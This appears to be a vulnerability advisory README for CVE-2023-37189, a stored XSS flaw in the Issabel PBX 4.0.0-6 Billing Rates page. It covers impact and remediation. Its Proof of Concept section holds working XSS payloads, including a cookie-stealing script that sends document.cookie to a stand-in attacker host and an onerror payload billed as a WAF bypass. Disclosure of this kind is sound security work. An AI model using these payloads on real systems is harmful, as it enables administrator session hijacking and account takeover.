# CVE-2023-37189 — Issabel PBX 4.0.0-6 Stored Cross-Site Scripting (XSS)

![CVE](https://img.shields.io/badge/CVE-2023--37189-red)
![Severity](https://img.shields.io/badge/Severity-Medium-orange)
![Type](https://img.shields.io/badge/Type-Stored%20XSS-blue)
![Vendor](https://img.shields.io/badge/Vendor-Issabel-informational)

---

## Overview

| Field                | Details                                                                   |
|----------------------|---------------------------------------------------------------------------|
| **CVE ID**           | CVE-2023-37189                                                            |
| **Vulnerability**    | Stored Cross-Site Scripting (XSS)                                         |
| **Affected Product** | Issabel PBX 4.0.0-6                                                       |
| **Affected URL**     | `index.php?menu=billing_rates`                                            |
| **Vulnerable Fields**| `Name` and `Prefix` fields in the *Create New Rate* module                |
| **Severity**         | Medium (CVSS 3.1 Base Score: **6.1** — AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N) |
| **Reported Date**    | 07 July 2023                                                              |
| **Discovered By**    | Sahil Ojha                                                                |
| **Tested On**        | Windows                                                                   |
| **Vendor Homepage**  | https://www.issabel.org/                                                  |
| **Software Source**  | https://github.com/IssabelFoundation/issabelPBX                           |

---

## Description

A **Stored Cross-Site Scripting (XSS)** vulnerability exists in **Issabel PBX version 4.0.0-6** within the Billing Rates management page (`index.php?menu=billing_rates`).

Issabel PBX is a widely used open-source Unified Communications platform built on top of FreePBX/Asterisk. Its *Billing → Rates* feature allows administrators to define call rate entries with a custom **Name** and **Prefix**. Due to insufficient input sanitization and output encoding, an authenticated attacker can inject arbitrary HTML or JavaScript into either field. The malicious script is then **persistently stored** in the application database and **automatically executed** in the browser of any user who subsequently visits the Rates page — including other administrators — without any additional interaction.

This class of vulnerability is particularly dangerous in administrative panels because:
- It can be used to **hijack session cookies** of other administrators, leading to full account takeover.
- It enables **phishing attacks** by modifying the appearance of the page served to victims.
- It can facilitate **CSRF token theft**, **keylogging**, or **redirection** to malicious sites.
- The payload persists until explicitly removed, meaning it can affect an unlimited number of victims over time.

---

## Vulnerability Details

- **Vulnerability Class:** Stored (Persistent) Cross-Site Scripting (CWE-79)
- **Attack Vector:** Network
- **Authentication Required:** Yes (low-privilege authenticated user or administrator account)
- **User Interaction:** Required (victim must visit the Billing Rates page)
- **Scope:** Changed (attacker can impact other users' browser sessions)
- **Root Cause:** Missing HTML encoding / output sanitization on the `Name` and `Prefix` fields when rendering stored values back to the page.

---

## Proof of Concept

The following payloads, when entered into the **Name** or **Prefix** field of the *Create New Rate* form, demonstrate the vulnerability:

**Basic alert (functionality check):**
```html
<script>alert('XSS')</script>
```

**Session cookie theft** *(replace `attacker.example.com` with a server you own and are authorized to use — never target real users or systems):*
```html
<script>document.location='https://attacker.example.com/steal?c='+document.cookie</script>
```

**Image-based onerror payload (WAF bypass):**
```html
<img src=x onerror="alert(document.cookie)">
```

> ⚠️ **Note:** These payloads are provided strictly for educational and security research purposes. Always obtain proper written authorization before testing on any system you do not own.

---

## Steps to Reproduce

1. **Log in** to the Issabel PBX web interface using an administrator account.

2. Navigate to **Reports → Billing → Rates** (URL: `index.php?menu=billing_rates`).

3. Click **"Create New Rate"** and enter a crafted XSS payload in either the **Prefix** or **Name** field.

   ![Step 2 – Injecting the payload into the Name/Prefix fields](https://github.com/sahiloj/CVE-2023-37189/blob/main/2.png)

4. Click **Save**. The payload is now stored in the database.

5. Any user (including other administrators) who visits the Billing Rates page will have the script **automatically executed** in their browser.

   ![Step 3 – Payload executes on page load](https://github.com/sahiloj/CVE-2023-37189/blob/main/3.png)

   ![Step 3 – Session cookie captured](https://github.com/sahiloj/CVE-2023-37189/blob/main/4.png)

---

## Impact

- **Session Hijacking:** Attackers can steal session cookies and impersonate other users or administrators.
- **Privilege Escalation:** By hijacking an administrator session, a lower-privileged attacker can gain full administrative control.
- **Data Exfiltration:** Sensitive information visible on the page can be silently exfiltrated.
- **Persistent Backdoor:** The payload remains active until manually removed, making this a persistent threat.

---

## Mitigation / Remediation

The vendor and system administrators are advised to apply the following countermeasures:

1. **Output Encoding:** Apply context-aware HTML encoding when rendering stored values back into the HTML page (e.g., use `htmlspecialchars()` in PHP with `ENT_QUOTES`). This is the primary and most reliable defense against XSS.
2. **Input Validation:** As a secondary defense-in-depth measure, reject or sanitize user-supplied input on the server side. Strip or encode HTML special characters (`<`, `>`, `"`, `'`, `&`) before storing data. Note that input validation alone can be bypassed and should not be relied upon as the sole control.
3. **Content Security Policy (CSP):** Deploy a strict `Content-Security-Policy` HTTP header to restrict the execution of inline scripts.
4. **Web Application Firewall (WAF):** Use a WAF with XSS detection rules as a defense-in-depth measure.
5. **Regular Security Audits:** Conduct periodic code reviews and penetration tests on all user-controlled input fields.

---

## References

- [NVD – CVE-2023-37189](https://nvd.nist.gov/vuln/detail/CVE-2023-37189)
- [MITRE CVE – CVE-2023-37189](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-37189)
- [OWASP: Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [Issabel PBX – Official Website](https://www.issabel.org/)
- [IssabelFoundation/issabelPBX – GitHub](https://github.com/IssabelFoundation/issabelPBX)

---

## Disclaimer

This repository and the information contained herein are provided for **educational and security research purposes only**. The author is not responsible for any misuse or damage caused by the information provided. Always obtain **explicit written permission** from the system owner before conducting any security testing.

---

*Discovered and reported by [Sahil Ojha](https://github.com/sahiloj)*
